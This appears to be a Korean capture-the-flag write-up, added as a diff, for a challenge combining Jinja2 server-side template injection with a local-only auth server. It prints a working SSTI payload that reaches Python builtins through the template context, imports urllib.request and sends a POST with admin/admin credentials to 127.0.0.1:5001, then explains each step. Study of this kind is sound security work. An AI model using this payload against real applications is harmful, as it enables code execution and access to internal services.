@@ -1,0 +1,29 @@
+1. 문제 구조 요약
+메인 웹 서버 (:5000): 사용자 입력을 받아 템플릿에 출력하는 서비스. SSTI 취약점 존재.
+
+내부 인증 서버 (127.0.0.1:5001/auth): 외부 접근이 불가능한 로컬 전용 서버. admin/admin 계정 정보로 POST 요청을 보내면 최종 FLAG 반환.
+
+2. 페이로드
+
+{{ self._TemplateReference__context.namespace.__init__.__globals__.__builtins__.__import__('urllib.request').request.urlopen(
+    self._TemplateReference__context.namespace.__init__.__globals__.__builtins__.__import__('urllib.request').request.Request(
+        'http://127.0.0.1:5001/auth',
+        data='{"user":"admin","pass":"admin"}'.encode('utf-8'),
+        headers={'Content-Type': 'application/json'}
+    )
+).read().decode('utf-8') }}
+
+3. 페이로드 분석
+self: Jinja2 템플릿 객체 자신을 가리키는 기본 제공 객체.
+
+._TemplateReference__context: 파이썬의 Name Mangling 기법을 이용해 템플릿의 컨텍스트 내부 변수에 접근.
+
+.namespace.__init__.__globals__: 네임스페이스 생성자 함수를 따라 올라가 해당 파이썬 프로세스의 전역 변수(__globals__) 공간 도달.
+
+.__builtins__.__import__('urllib.request'): 기본 내장 함수 __import__를 호출하여 HTTP 요청용 모듈인 urllib.request 동적 임포트.
+
+.Request(...): 내부 주소(127.0.0.1:5001/auth), POST 전송 데이터, JSON 헤더를 포함하는 HTTP Request 객체 생성.
+
+.urlopen(...): 작성한 Request 객체를 실행하여 로컬 내부 서버로 POST 요청 전송.
+
+.read().decode('utf-8'): 내부 서버 응답 바이트를 읽어 사람이 읽을 수 있는 UTF-8 문자열로 변환.
